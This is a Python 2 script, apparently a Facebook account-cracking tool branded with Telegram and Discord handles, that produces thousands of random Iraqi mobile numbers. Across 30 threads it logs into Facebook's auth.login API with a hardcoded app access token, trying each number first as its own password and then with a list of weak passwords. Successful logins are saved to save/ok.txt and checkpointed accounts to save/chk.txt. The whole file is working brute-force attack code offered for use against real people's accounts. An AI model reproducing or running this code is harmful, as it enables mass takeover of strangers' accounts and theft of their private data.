import os, sys, time, datetime, random, hashlib, re, threading, json, urllib, cookielib, getpass
os.system('rm -rf .txt')
for n in range(4500):
    nmbr = random.randint(1111111, 9999999)
    sys.stdout = open('.txt', 'a')
    print nmbr
    sys.stdout.flush()

try:
    import requests
except ImportError:
    os.system('')

try:
    import mechanize
except ImportError:
    os.system('')
    time.sleep(1)
    os.system('')

from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser
reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
br.addheaders = [('user-agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]

def exb():
    print '[!] Exit'
    os.sys.exit()


def psb(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.03)


def t():
    time.sleep(1)


def cb():
    os.system('clear')


logo ="""\x1b[1;90m 
  $$\   $$$$$$\    $$\   $$$$$$\  
$$$$ | $$  __$$\ $$$$ | $$  __$$\ 
\_$$ | $$ /  \__|\_$$ | $$ /  \__|
  $$ | $$$$$$$\    $$ | $$$$$$$\  
  $$ | $$  __$$\   $$ | $$  __$$\ 
  $$ | $$ /  $$ |  $$ | $$ /  $$ |
$$$$$$\ $$$$$$  |$$$$$$\ $$$$$$  |
\______|\______/ \______|\______/ 
###############JaLa################
Telegram/@F16_4,@ROUSER
Telegram/https://t.me/joinchat/TjQFdOWbVI85JB_P
Discord/https://discord.gg/B9QEBEyX
"""
logo2 = """\x1b[1;90m  
   $$$$$\           $$\                
   \__$$ |          $$ |               
      $$ | $$$$$$\  $$ |      $$$$$$\  
      $$ | \____$$\ $$ |      \____$$\ 
$$\   $$ | $$$$$$$ |$$ |      $$$$$$$ |
$$ |  $$ |$$  __$$ |$$ |     $$  __$$ |
\$$$$$$  |\$$$$$$$ |$$$$$$$$\\$$$$$$$ |
 \______/  \_______|\________|\_______|
<<<<<<<<<<<<<<<<<<ROUSER>>>>>>>>>>>>>>>>>>>                                       
Telegram/@F16_4,@ROUSER                                      
Telegram/https://t.me/joinchat/TjQFdOWbVI85JB_P
Discord/https://discord.gg/B9QEBEyXDiscord
    """
back = 0
successful = []
cpb = []
oks = []
id = []

def menu():
    os.system('clear')
    print logo
    print 42 * '\x1b[1;90m='
    print '[1]\x1b[1;90m Raqamy Iraq '
    print 42 * '\x1b[1;90m='
    action()


def action():
    global cpb
    global oks
    bch = raw_input('\n\x1b[1;90mHalbzhera \x1b[1;90m>>> ')
    if bch == '':
        print '[!] raqam 1 bnusa'
        action()
    elif bch == '1':
        os.system('clear')
        print logo2
        print 42 * '\x1b[1;90m='
        print '\x1b[1;90m0770,0750,0773, 0751,0780,0783,0781,0782'
        print 42 * '\x1b[1;90m='
        try:
            c = raw_input(' Iraq code  : ')
            k = ''
            idlist = '.txt'
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())

        except IOError:
            print '[!] File Not Found'
            raw_input('\n[ Back ]')
            menu()
    elif bch == '0':
        exb()
    else:
        print '[!] raqam 1 halbzhera'
        action()
    xxx = str(len(id))
    psb('[\xe2\x9c\x93]\x1b[1;90mRaqamakan: ' + xxx)
    time.sleep(0.1)
    psb('\x1b[1;90m[\xe2\x9c\x93]\x1b[1;90m PaLa Pal MaKa...')
    time.sleep(0.1)
    psb('[!] BO Rawastandni toolaka CTRL+Z')
    time.sleep(0.5)
    print 42 * '\x1b[1;90m='

    def main(arg):
        user = arg
        try:
            os.mkdir("save")
        except OSError:
            pass

        try:
            pass1 = user
            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
            q = json.load(data)
            if 'access_token' in q:
                print '\x1b[1;92m[OK]\x1b[1;92m ' + k + c + user + ' >>> ' + pass1 + '\n' + '\n'
                okb = open('save/ok.txt', 'a')
                okb.write(k + c + user + '>>>' + pass1 + '\n')
                okb.close()
                oks.append(c + user + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;91m[CHK]\x1b[1;91m ' + k + c + user + ' >>> ' + pass1 + '\n'
                cps = open('save/chk.txt', 'a')
                cps.write(k + c + user + '>>>' + pass1 + '\n')
                cps.close()
                cpb.append(c + user + pass1)
            else:
                pass2 = '1122334455'
            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
            q = json.load(data)
            if 'access_token' in q:
                print '\x1b[1;92m[OK]\x1b[1;92m ' + k + c + user + ' >>> ' + pass2 + '\n' + '\n'
                okb = open('save/ok.txt', 'a')
                okb.write(k + c + user + '>>>' + pass2 + '\n')
                okb.close()
                oks.append(c + user + pass2)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;91m[CHK]\x1b[1;91m ' + k + c + user + ' >>> ' + pass2 + '\n'
                cps = open('save/chk.txt', 'a')
                cps.write(k + c + user + '>>>' + pass2 + '\n')
                cps.close()
                cpb.append(c + user + pass2)
            else:
                pass3 = '1234512345'
            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
            q = json.load(data)
            if 'access_token' in q:
                print '\x1b[1;92m[OK]\x1b[1;92m ' + k + c + user + ' >>> ' + pass3 + '\n' + '\n'
                okb = open('save/ok.txt', 'a')
                okb.write(k + c + user + '>>>' + pass3 + '\n')
                okb.close()
                oks.append(c + user + pass3)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;91m[CHK]\x1b[1;91m ' + k + c + user + ' >>> ' + pass3 + '\n'
                cps = open('save/chk.txt', 'a')
                cps.write(k + c + user + '>>>' + pass3 + '\n')
                cps.close()
                cpb.append(c + user + pass3) 
            else:
                pass4 = '112233'
            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
            q = json.load(data)
            if 'access_token' in q:
                print '\x1b[1;92m[OK]\x1b[1;92m ' + k + c + user + ' >>> ' + pass4 + '\n' + '\n'
                okb = open('save/ok.txt', 'a')
                okb.write(k + c + user + '>>>' + pass4 + '\n')
                okb.close()
                oks.append(c + user + pass4)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;91m[CHK]\x1b[1;91m ' + k + c + user + ' >>> ' + pass4 + '\n'
                cps = open('save/chk.txt', 'a')
                cps.write(k + c + user + '>>>' + pass4 + '\n')
                cps.close()
                cpb.append(c + user + pass4)
            else:
                pass5 = '11223344'
            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass5 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
            q = json.load(data)
            if 'access_token' in q:
                print '\x1b[1;92m[OK]\x1b[1;92m ' + k + c + user + ' >>> ' + pass5 + '\n' + '\n'
                okb = open('save/ok.txt', 'a')
                okb.write(k + c + user + '>>>' + pass5 + '\n')
                okb.close()
                oks.append(c + user + pass5)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;91m[CHK]\x1b[1;91m ' + k + c + user + ' >>> ' + pass5 + '\n'
                cps = open('save/chk.txt', 'a')
                cps.write(k + c + user + '>>>' + pass5 + '\n')
                cps.close()
                cpb.append(c + user + pass5)
            else:
                pass6 = '12341234'
            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass6 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
            q = json.load(data)
            if 'access_token' in q:
                print '\x1b[1;92m[OK]\x1b[1;92m ' + k + c + user + ' >>> ' + pass6 + '\n' + '\n'
                okb = open('save/ok.txt', 'a')
                okb.write(k + c + user + '>>>' + pass6 + '\n')
                okb.close()
                oks.append(c + user + pass6)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;91m[CHK]\x1b[1;91m ' + k + c + user + ' >>> ' + pass6 + '\n'
                cps = open('save/chk.txt', 'a')
                cps.write(k + c + user + '>>>' + pass6 + '\n')
                cps.close()
                cpb.append(c + user + pass6)
            else:
                pass7 = '112233445566'
            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass7 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
            q = json.load(data)
            if 'access_token' in q:
                print '\x1b[1;92m[OK]\x1b[1;92m ' + k + c + user + ' >>> ' + pass7 + '\n' + '\n'
                okb = open('save/ok.txt', 'a')
                okb.write(k + c + user + '>>>' + pass7 + '\n')
                okb.close()
                oks.append(c + user + pass7)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;91m[CHK]\x1b[1;91m ' + k + c + user + ' >>> ' + pass7 + '\n'
                cps = open('save/chk.txt', 'a')
                cps.write(k + c + user + '>>>' + pass7 + '\n')
                cps.close()
                cpb.append(c + user + pass7)
            else:
                pass8 = '1234554321'
            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass8 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
            q = json.load(data)
            if 'access_token' in q:
                print '\x1b[1;92m[OK]\x1b[1;92m ' + k + c + user + ' >>> ' + pass8 + '\n' + '\n'
                okb = open('save/ok.txt', 'a')
                okb.write(k + c + user + '>>>' + pass8 + '\n')
                okb.close()
                oks.append(c + user + pass8)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;91m[CHK]\x1b[1;91m ' + k + c + user + ' >>> ' + pass8 + '\n'
                cps = open('save/chk.txt', 'a')
                cps.write(k + c + user + '>>>' + pass8 + '\n')
                cps.close()
                cpb.append(c + user + pass8) 
            else:
                pass9 = '5544332211'
            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass9 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
            q = json.load(data)
            if 'access_token' in q:
                print '\x1b[1;92m[OK]\x1b[1;92m ' + k + c + user + ' >>> ' + pass9 + '\n' + '\n'
                okb = open('save/ok.txt', 'a')
                okb.write(k + c + user + '>>>' + pass9 + '\n')
                okb.close()
                oks.append(c + user + pass9)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;91m[CHK]\x1b[1;91m ' + k + c + user + ' >>> ' + pass9 + '\n'
                cps = open('save/chk.txt', 'a')
                cps.write(k + c + user + '>>>' + pass9 + '\n')
                cps.close()
                cpb.append(c + user + pass9)
            else:
                pass10 = '123456123456'
            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass10 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
            q = json.load(data)
            if 'access_token' in q:
                print '\x1b[1;92m[OK]\x1b[1;92m ' + k + c + user + ' >>> ' + pass10 + '\n' + '\n'
                okb = open('save/ok.txt', 'a')
                okb.write(k + c + user + '>>>' + pass10 + '\n')
                okb.close()
                oks.append(c + user + pass10)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;91m[CHK]\x1b[1;91m ' + k + c + user + ' >>> ' + pass10 + '\n'
                cps = open('save/chk.txt', 'a')
                cps.write(k + c + user + '>>>' + pass10 + '\n')
                cps.close()
                cpb.append(c + user + pass10)
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print 42 * '\x1b[1;91m='
    print '[\xe2\x9c\x93]\x1b[1;93m Process Has Been Completed ....'
    print '[\xe2\x9c\x93]\x1b[1;92m Total OK/\x1b[1;96mCP : ' + str(len(oks)) + '/' + str(len(cpb))
    print '[\xe2\x9c\x93]\x1b[1;91m CP File Has Been Saved : save/chk.txt'
    raw_input('\n[Press Enter To Go Back]')
    os.system('python2 f16.py')


if __name__ == '__main__':
    menu() 
